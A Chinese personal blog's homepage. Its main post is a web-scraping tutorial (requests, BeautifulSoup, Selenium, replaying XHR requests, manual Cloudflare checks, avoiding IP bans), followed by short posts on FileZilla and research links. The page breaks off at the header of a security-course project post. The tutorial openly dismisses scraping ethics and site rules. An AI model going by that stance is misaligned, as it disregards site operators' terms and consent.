<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.2.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="可爱就是正义！">
<meta property="og:type" content="website">
<meta property="og:title" content="小乖乖的妙妙屋">
<meta property="og:url" content="http://example.com/">
<meta property="og:site_name" content="小乖乖的妙妙屋">
<meta property="og:description" content="可爱就是正义！">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="Qing-LKY">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>小乖乖的妙妙屋</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><link rel="alternate" href="/atom.xml" title="小乖乖的妙妙屋" type="application/atom+xml">
<style>mjx-container[jax="SVG"] {
  direction: ltr;
}

mjx-container[jax="SVG"] > svg {
  overflow: visible;
}

mjx-container[jax="SVG"][display="true"] {
  display: block;
  text-align: center;
  margin: 1em 0;
}

mjx-container[jax="SVG"][justify="left"] {
  text-align: left;
}

mjx-container[jax="SVG"][justify="right"] {
  text-align: right;
}

g[data-mml-node="merror"] > g {
  fill: red;
  stroke: red;
}

g[data-mml-node="merror"] > rect[data-background] {
  fill: yellow;
  stroke: none;
}

g[data-mml-node="mtable"] > line[data-line] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > rect[data-frame] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > .mjx-dashed {
  stroke-dasharray: 140;
}

g[data-mml-node="mtable"] > .mjx-dotted {
  stroke-linecap: round;
  stroke-dasharray: 0,140;
}

g[data-mml-node="mtable"] > svg {
  overflow: visible;
}

[jax="SVG"] mjx-tool {
  display: inline-block;
  position: relative;
  width: 0;
  height: 0;
}

[jax="SVG"] mjx-tool > mjx-tip {
  position: absolute;
  top: 0;
  left: 0;
}

mjx-tool > mjx-tip {
  display: inline-block;
  padding: .2em;
  border: 1px solid #888;
  font-size: 70%;
  background-color: #F8F8F8;
  color: black;
  box-shadow: 2px 2px 5px #AAAAAA;
}

g[data-mml-node="maction"][data-toggle] {
  cursor: pointer;
}

mjx-status {
  display: block;
  position: fixed;
  left: 1em;
  bottom: 1em;
  min-width: 25%;
  padding: .2em .4em;
  border: 1px solid #888;
  font-size: 90%;
  background-color: #F8F8F8;
  color: black;
}

foreignObject[data-mjx-xml] {
  font-family: initial;
  line-height: normal;
  overflow: visible;
}

.MathJax path {
  stroke-width: 3;
}

mjx-container[display="true"] {
  overflow: auto hidden;
}

mjx-container[display="true"] + br {
  display: none;
}
</style></head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">小乖乖的妙妙屋</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-rss">

    <a href="/atom.xml" rel="section"><i class="fa fa-rss fa-fw"></i>RSS</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/01/11/%E5%9F%BA%E7%A1%80%E7%88%AC%E8%99%AB%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Qing-LKY">
      <meta itemprop="description" content="可爱就是正义！">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="小乖乖的妙妙屋">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/01/11/%E5%9F%BA%E7%A1%80%E7%88%AC%E8%99%AB%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/" class="post-title-link" itemprop="url">基础爬虫思路整理</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2025-01-11 13:22:08 / 修改时间：23:06:02" itemprop="dateCreated datePublished" datetime="2025-01-11T13:22:08+08:00">2025-01-11</time>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>5k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>8 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>个人将爬虫分为两类，一类是直接使用 requests 库爬取的，一类是需要使用 selenium 爬取的（比如 js 动态加载）。无论是哪一类，都需要控制请求的频率。</p>
<p>代码的部分基本可以要求 kimi 生成或自己查 api，所以不做赘述。此处仅介绍爬取的思路。</p>
<h2 id="分析内容加载方式"><a href="#分析内容加载方式" class="headerlink" title="分析内容加载方式"></a>分析内容加载方式</h2><p>一般情况下，F12 可以唤起浏览器的开发者工具。我们可以使用 F12 来对网页进行分析，决定下一步该做什么。</p>
<p>一般来讲，我们在浏览器上看到的网页，是浏览器加载各种 js 后显示出来的。但在我们使用 requests 库或 curl 时，由于不存在浏览器环境，并不会加载 js，所以我们需要判断<strong>要爬取的内容是否在目标页面直接响应的时候就已经存在</strong>。</p>
<p>一种简单的方式是直接 curl 获取页面的源码，然后检查里面是否有我们想爬的内容。这里我们介绍一下用 F12 来查看。</p>
<p>由于 F12 的网络工具只有在打开时才会记录请求，所以打开 F12 并点击“网络”后还要重新刷新一下页面。一般的，一个页面的直接响应会在第一位。</p>
<p><img src="/images/%E7%9B%B4%E6%8E%A5%E5%93%8D%E5%BA%94.png"></p>
<p>单击那个请求，点击响应，就可以看到那个响应的源码。使用 ctrl+F 搜索就可以判断想要的内容是否在上面。</p>
<p><strong>如果内容不在上面，那么我们将无法直接使用 requests 库爬取页面</strong>。也就是常见的反爬手段：JS 动态加载。</p>
<p>下面的微博就是一个例子。微博的内容并不在 document 类型的页面直接响应中。通过查找，我们可以发现它在一个 hottimeline 的 xhr 类型的请求里。</p>
<p><img src="/images/%E5%BE%AE%E5%8D%9A%E7%9A%84%E5%8F%8D%E4%BE%8B.png"></p>
<p>对于无法直接使用 requests 爬取 html 页面然后使用 beautifulsoup 分析页面代码的，有以下两种思路：</p>
<p>首先，直接发起对应的请求。requests 并不只能请求 html 页面，如果你能分析出内容所在的这个请求是怎么生成的（比如上面的 hottimeline 这个请求），那么你可以<strong>直接代替浏览器用 requests 库来发起它</strong>。</p>
<p>单击该请求，你可以尝试模仿它的 url、标头、载荷、cookie，看看能不能获取到想要的内容。</p>
<p><img src="/images/%E6%A8%A1%E4%BB%BF%E8%AF%B7%E6%B1%82.png"></p>
<p>某种意义上讲，你也可以称其为<strong>对页面加载过程的逆向</strong>。可能比较复杂，特别在需要涉及到 cookie 凭证的生成等等的时候，感兴趣的可以试一下。</p>
<p>第二种思路就是直接使用 <strong>selenium</strong> 库。也就是浏览器自动化测试工具。这种方式原理和实现也比较简单，相当于自动打开一个浏览器，让浏览器自己加载内容然后爬取。不用操心乱七八糟的 js 动态加载、 CloudFlare 认证等，可以让浏览器甚至手动代劳。</p>
<p>但是 selenium 需要图形截面和 <a target="_blank" rel="noopener" href="https://developer.microsoft.com/zh-cn/microsoft-edge/tools/webdriver/?cs=4112006293&form=MA13LH">webdriver</a>，所以难以在服务器上运行。</p>
<h2 id="定位-DOM-元素"><a href="#定位-DOM-元素" class="headerlink" title="定位 DOM 元素"></a>定位 DOM 元素</h2><p>直接在页面上对应位置右键然后点击“检查”，可以跳转到元素。而在元素页面挪动鼠标，可以在页面上高亮出该元素的对应内容。</p>
<p><img src="/images/%E6%9F%A5%E7%9C%8B%E5%85%83%E7%B4%A0.png"></p>
<p>通过这种方式，你可以判断目标元素的位置，然后在右键菜单栏中复制定位的辅助信息比如 XPath 等（也可以自行观察元素 html 代码的属性），用于在代码中抓取指定元素的内容。</p>
<p>请注意，“元素”栏显示的是网页完成加载后的页面元素，如果使用的是 selenium，可以直接参照它来定位。但如果使用的是 requests，元素里呈现的可能与初始响应的不同（当然，大多数情况下是相同的）。</p>
<p>有一些特殊的情况，比如内容虽然包含在直接响应里，但是并不是在 html 页面上，而是在 html 页面源码的 js 块里（比如 <a target="_blank" rel="noopener" href="https://ieeexplore.ieee.org/abstract/document/10498135">IEEE</a>）。</p>
<p>实际上，由于 response.text 实际上就是整个响应的 html 源码，直接对 response.text 使用正则表达式匹配出来即可。下面是一个从 IEEE 的某个文章页面的 js 代码里抓取 <code>xplGlobal.document.metadata</code> 的例子：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">response = requests.get(url, headers=headers)</span><br><span class="line"><span class="keyword">if</span> response.status_code != <span class="number">200</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">f"response status_code <span class="subst">{response.status_code}</span>"</span>)</span><br><span class="line"><span class="comment"># 获取 JS 里的 metadata</span></span><br><span class="line">pattern = <span class="string">r"xplGlobal\.document\.metadata\s*=\s*(.*);(?=\s*\n)"</span></span><br><span class="line">match = re.search(pattern, response.text)</span><br><span class="line">metadata = match.group(<span class="number">1</span>).strip()</span><br><span class="line">ieee_data = json.loads(metadata)</span><br></pre></td></tr></table></figure>

<h2 id="通用流程"><a href="#通用流程" class="headerlink" title="通用流程"></a>通用流程</h2><p>其实针对页面的爬虫编写的步骤可以概括为：</p>
<ol>
<li><p>获取包含有想要内容的页面（使用 selenium 的 <code>driver.get</code> 或 requests 库发起请求）</p>
</li>
<li><p>确定要爬的内容是哪个元素</p>
</li>
<li><p>使用页面解析库定位并获取元素（这一步如果不懂，可以把辅助信息比如 xpath、对应元素的 html 源码等发送给 kimi 要求针对性的生成代码）：</p>
<p>a. 对于直接 requests 得到的 response，可以使用 beautifulsoup 或 lxml 等；</p>
<p>b. 对于 selenium，直接使用 <code>find_elements</code></p>
</li>
<li><p>处理数据并保存</p>
</li>
</ol>
<h2 id="使用-beautifulsoup-分析并定位元素"><a href="#使用-beautifulsoup-分析并定位元素" class="headerlink" title="使用 beautifulsoup 分析并定位元素"></a>使用 beautifulsoup 分析并定位元素</h2><p>beautifulsoup 仅支持基于标签名的检索。下面是一个从 <a target="_blank" rel="noopener" href="https://www.ndss-symposium.org/ndss-paper/architecting-trigger-action-platforms-for-security-performance-and-functionality/">ndss</a> 上爬取作者、摘要信息的例子：</p>
<p><img src="/images/NDSS%E7%88%AC%E5%8F%96.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">response = requests.get(url)</span><br><span class="line"><span class="keyword">if</span> response.status_code != <span class="number">200</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(response.status_code)</span><br><span class="line">soup = BeautifulSoup(response.text, <span class="string">"html.parser"</span>)</span><br><span class="line">paper_data_div = soup.find(<span class="string">'div'</span>, class_=<span class="string">'paper-data'</span>)</span><br><span class="line">author_extra = <span class="string">""</span></span><br><span class="line">abstract = <span class="string">""</span></span><br><span class="line"><span class="keyword">if</span> paper_data_div:</span><br><span class="line">    paragraphs = paper_data_div.find_all(<span class="string">'p'</span>)</span><br><span class="line">    <span class="comment"># 段落一对应作者（含单位）</span></span><br><span class="line">    author_extra = paragraphs[<span class="number">0</span>].get_text(strip=<span class="literal">True</span>)</span><br><span class="line">    institutions = ndss_get_institution(author_extra)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(institutions)):</span><br><span class="line">        paper[<span class="string">"author"</span>][i][<span class="string">"from"</span>] = institutions[i]</span><br><span class="line">    <span class="comment"># 后续对应摘要</span></span><br><span class="line">    abstract = <span class="string">'\n'</span>.join([p.get_text(strip=<span class="literal">True</span>) <span class="keyword">for</span> p <span class="keyword">in</span> paragraphs[<span class="number">1</span>:]])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">"&lt;div paper-data&gt; not found!"</span>)</span><br><span class="line"><span class="comment"># paper["author_extra"] = author_extra</span></span><br><span class="line">paper[<span class="string">"abstract"</span>] = abstract</span><br></pre></td></tr></table></figure>

<p>需要注意的是，requests 得到的是直接响应。上面的 NDSS 例子中网页结构比较简单，元素与直接响应是对应的。如果你在 F12 中看到了某个元素，但是实际爬的时候没有找到，应该去检查直接响应里这个元素是否存在，以直接响应为准处理。</p>
<p>换句话讲，使用 requests 爬取页面时，不要过分依赖浏览器页面上的元素布置（尤其是相对布置），因为那有可能是前端在加载页面的时候额外从 js 里弄上去的。</p>
<p>至于使用 requests 发起 api 请求的，得到的内容并不是 html 格式，需要使用其它的方式处理。当然，也更简单了。</p>
<h2 id="使用-selenium-爬取元素"><a href="#使用-selenium-爬取元素" class="headerlink" title="使用 selenium 爬取元素"></a>使用 selenium 爬取元素</h2><p>下面是使用 selenium 加载并爬取页面元素的基本例子（以推特的页面为例）：</p>
<p><img src="/images/X%E7%88%AC%E5%8F%96%E7%A4%BA%E4%BE%8B.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">driver = webdriver.Edge()</span><br><span class="line">driver.get(<span class="string">"https://x.com/zmjjkk/photo"</span>)</span><br><span class="line">photo_xpath = <span class="string">'//img[@alt="Image" and contains(@src, "https://pbs.twimg.com/profile_images/") and contains(@src, "_400x400.jpg")]'</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">  WebDriverWait(driver, <span class="number">10</span>).until(</span><br><span class="line">      expected_conditions.presence_of_element_located((By.XPATH, photo_xpath))</span><br><span class="line">  )</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">f"<span class="subst">{Fore.RED}</span>Fail to get photo when trying for uid <span class="subst">{uid}</span><span class="subst">{Style.RESET_ALL}</span>"</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">  <span class="comment"># looks changable</span></span><br><span class="line">  img_element = driver.find_element(By.XPATH, photo_xpath)</span><br><span class="line">  img_url = img_element.get_attribute(<span class="string">'src'</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">f"<span class="subst">{Fore.RED}</span>Fail to get img url when trying for uid <span class="subst">{uid}</span>: <span class="subst">{e}</span><span class="subst">{Style.RESET_ALL}</span>"</span>)</span><br><span class="line"><span class="keyword">return</span> (name, intro, img_url)</span><br></pre></td></tr></table></figure>

<p>由于 selenium 需要用浏览器来加载页面，我们需要给出足够的等待时间来让 js 上的内容加载到页面上。</p>
<p>你可能注意到了，我代码中使用的 XPath 非常特殊。这是因为使用 selenium 抓取页面存在一个问题：不稳定性。</p>
<p>以 X 的页面为例，它的 DOM 元素是前端框架动态加载的。当你调整浏览器的窗口大小、甚至换一个环境，元素对应的位置和 class 可能就会发生改变。为此，我们需要找到一个更加稳定的方式来获取这个元素。所以我结合了该 img 标签的特征写下了上面的代码。</p>
<p>当然，只要你把你的需求描述清楚，把你要爬的内容和元素的特征（甚至整个元素的源码复制上去）描述清楚，kimi 也是可以代劳的。</p>
<p>使用 selenium 的另一个好处是可以手动处理一些复杂的事情，比如登录。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">driver.get(<span class="string">"https://x.com"</span>)</span><br><span class="line"><span class="built_in">input</span>(<span class="string">"Press any key to continue"</span>)</span><br></pre></td></tr></table></figure>

<p>我们完全可以在打开的浏览器上把有需要做的事情（比如 cloudflare 人机验证、页面登录）的事情全干了。然后再让它运行。</p>
<p>当然，最优雅最完美的方法肯定是去研究那些东西的机制，而不是手动来做。</p>
<h2 id="防止被-ban"><a href="#防止被-ban" class="headerlink" title="防止被 ban"></a>防止被 ban</h2><p>什么道德啊爬虫守则啊这些就不扯淡了。总之爬虫时，建议至少设置一个类似于正常浏览器的 header，并控制请求频率。</p>
<p>部分网站反爬只是断开链接，影响是暂时，而有些网站则会直接 ban 掉你的 ip（比如 dl.acm）。所以还是建议保持足够长的间隔，最好是到10s。没必要那么着急。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>其实我自己也没有多了解爬虫和 Web，这篇文章只是把我了解到的写下来，不保证准确。</p>
<p>selenium 基本是万能的解法。但有些时候还是要分析一下 F12 抓到的请求看看有没有更方便更优雅的做法。</p>
<p>并且，当你是打算抓取某个网站的“全部页面”时，你需要考虑一下你要从哪里知道所谓的“全部页面”是哪些。换句话讲：你需要先抓取导航页得到文章列表（也有些网站的文章列表藏在 JS 或某些可模仿的 API 请求里，<strong>善用 F12 和 Ctrl+F，你会找到最优雅最高效的解法</strong>），再抓取文章内容。只要有思路，实现起来都不难，毕竟有各种生成式 AI 可以辅助你。</p>
<p>此外，Github 上也许有已经写好的开源爬虫库可以使用，特别是 X 之类的网站。如果你要对付的是比较著名的页面，在网络上搜索也许能找到现成的代码资源。</p>
<h2 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h2><p content="6K6w5L2P77yM5LiN566h5piv54is6Jmr6L+Y5piv5Lu75L2V5Yir55qE5Lic6KW/77yMa2ltaSDlj6/ku6XovoXliqnkvaDlrp7njrDvvIzkvYYqKuS4jeimgeaKiiBraW1pIOW9k+eIuSoq77yM6Iez5bCR6KaB55yL5oeCIGtpbWkg5Lii57uZ5L2g55qE5piv5LuA5LmI44CC6Zmk6Z2e5L2g6IO95YOP5p+Q5p2h5pW05aSp6KOF5qih5YGa5qC35YW25a6e5LuA5LmI6YO95LiN5Lya5LuA5LmI5LqL5oOF6YO95Y+q55+l6YGT5b6A5LiL6Z2i55Sp57uZa2ltaeeIueWwveWtnemDveWtneS4jeaYjueZvemAu+i+keS4gOWdqOaehOW8j+WumOWRs+Wkp+eahOWPkeeYn+eahOWtpuacr+Wltum+meS4gOagt+aIkOWkqeacieS6uuWFnOW6leOAgg==">。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/12/17/FileZilla%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AE%BE%E7%BD%AE/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Qing-LKY">
      <meta itemprop="description" content="可爱就是正义！">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="小乖乖的妙妙屋">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/12/17/FileZilla%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AE%BE%E7%BD%AE/" class="post-title-link" itemprop="url">FileZilla服务端设置</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2024-12-17 18:02:55 / 修改时间：18:55:15" itemprop="dateCreated datePublished" datetime="2024-12-17T18:02:55+08:00">2024-12-17</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%85%B6%E5%AE%83/" itemprop="url" rel="index"><span itemprop="name">其它</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>32</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>1 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="如何设置">如何设置</h2>
<p>记得设置被动模式的端口范围，然后在入站规则里加入对应范围</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/12/02/%E7%A7%91%E7%A0%94%E8%B5%84%E6%BA%90%E6%95%B4%E7%90%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Qing-LKY">
      <meta itemprop="description" content="可爱就是正义！">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="小乖乖的妙妙屋">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/12/02/%E7%A7%91%E7%A0%94%E8%B5%84%E6%BA%90%E6%95%B4%E7%90%86/" class="post-title-link" itemprop="url">科研资源整理</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-12-02 18:35:21" itemprop="dateCreated datePublished" datetime="2024-12-02T18:35:21+08:00">2024-12-02</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-12-17 17:53:16" itemprop="dateModified" datetime="2024-12-17T17:53:16+08:00">2024-12-17</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E7%A7%91%E7%A0%94/" itemprop="url" rel="index"><span itemprop="name">科研</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>135</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>1 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="前言">前言</h2>
<p>把一些有用的科研资源简单的整理一下。</p>
<h2 id="期刊会议列表">期刊会议列表</h2>
<p><a target="_blank" rel="noopener" href="https://www.ccf.org.cn/Academic_Evaluation/By_category/">中国计算机学会推荐国际学术会议和期刊目录</a></p>
<h2 id="工具软件">工具软件</h2>
<p><a target="_blank" rel="noopener" href="https://zotero-chinese.com/">Zotero 非官方中文社区</a>
(建议使用坚果云替代原本的同步)</p>
<h2 id="学者页面">学者页面</h2>
<h3 id="武汉大学">武汉大学</h3>
<p><a target="_blank" rel="noopener" href="https://scholar.google.com/citations?user=-ykV7IQAAAAJ&amp;hl=zh-CN&amp;oi=ao">何德彪</a>:
密码学、区块链 <a target="_blank" rel="noopener" href="https://scholar.google.com/citations?user=iUdr3DIAAAAJ&amp;hl=zh-CN">彭聪</a>:
密码学、隐私计算</p>
<h3 id="其它">其它</h3>
<p><a target="_blank" rel="noopener" href="https://scholar.google.com/citations?user=C7htwEIAAAAJ&amp;hl=zh-CN&amp;oi=ao">南方科技大学
张殷乾</a>: TEE 安全、机密计算、侧信道</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/04/06/CS155-Project2-%E5%AE%9E%E9%AA%8C%E8%AE%B0%E5%BD%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Qing-LKY">
      <meta itemprop="description" content="可爱就是正义！">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="小乖乖的妙妙屋">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/04/06/CS155-Project2-%E5%AE%9E%E9%AA%8C%E8%AE%B0%E5%BD%95/" class="post-title-link" itemprop="url">CS155 Project2 实验记录</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
